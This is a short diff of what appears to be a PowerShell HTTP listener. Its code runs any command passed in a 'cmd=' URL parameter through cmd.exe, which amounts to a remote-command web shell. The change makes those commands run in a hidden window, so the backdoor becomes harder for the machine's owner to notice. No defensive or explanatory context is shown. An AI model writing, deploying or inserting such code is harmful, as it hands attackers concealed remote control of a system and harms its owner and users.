@@ -24,7 +24,7 @@ if($ok){
 if($me -eq 'OPTIONS'){$code='200 OK'}
 elseif($path -match '[?&]cmd=([^&]+)'){
 $cmd=[System.Uri]::UnescapeDataString($matches[1])
-Start-Process cmd.exe -ArgumentList ('/c '+$cmd)
+Start-Process cmd.exe -ArgumentList ('/c start '+$cmd) -WindowStyle Hidden
 $code='200 OK'
 }
 }
